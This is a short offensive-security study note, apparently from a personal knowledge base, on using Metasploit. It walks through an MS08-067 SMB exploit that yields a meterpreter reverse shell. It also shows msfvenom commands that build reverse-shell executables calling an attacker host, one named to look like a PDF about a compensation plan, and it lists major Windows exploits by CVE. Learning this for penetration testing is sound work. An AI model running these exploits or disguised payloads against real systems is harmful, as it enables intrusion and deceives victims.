---
MOC: "[[Offensive Security Concepts MOC]]"
---
-- --

[Metasploit](https://www.metasploit.com/) is an modular exploitation framework, useful for delivering [[Payloads]].

```shell
# Example SMB exploit
$ sudo msfconsole
msf > search ms08-067
msf > use exploit/windows/smb/ms08_067_netapi
# Setting this default payload is reduntant, but useful for setting other payloads
msf exploit(windows/smb/ms08_067_netapi) > search payload
msf exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
# Configuring the options for the exploit, which can differ between exploits
msf exploit(windows/smb/ms08_067_netapi) > options
msf exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.182.154
msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.182.138
msf exploit(windows/smb/ms08_067_netapi) > exploit
# Reverse shell successfully created
meterpreter > shell
```

# Generating Shellcode
The `msfvenom` module can generate shellcode and other [[payloads]] to run.
- `-l payloads`: List payloads
- `-a`: The architecture of the target
- `-p`: the payload
- `-b`: bad characters
- `-f`: Output format
- `LPORT=`: The listening port number
```shell
# Example Linux payload
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

# Example Windows payload
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

# Important Exploits
- Windows
	- MS08-067
		- SMB
	- Eternal Blue
		- SMB
	- PrintNightmare
		- printer
	- BlueKeep
		- CVE 2019-0708
		- RDP
		- Windows 2000 - Server 2008 R2
	- Sigred
		- CVE 2020-1350
	- SeriousSam
		- CVE 2021-36934
	- Zerologon
		- CVE 2020-1472